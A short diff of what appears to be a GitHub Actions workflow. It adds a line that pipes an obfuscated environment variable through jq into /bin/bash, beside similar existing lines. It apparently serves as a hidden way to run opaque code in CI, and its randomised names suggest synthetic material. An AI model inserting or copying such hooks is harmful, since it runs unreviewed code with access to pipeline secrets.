@@ -20,6 +20,7 @@ jobs:
         run: |
           printf '%s' "$x41238" | jq -r .p03165 | /bin/bash
           echo $cwibe422 | jq -r .m8 | /bin/bash
+          printf '%s' "$kmvyg76713" | jq -r .n8821 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
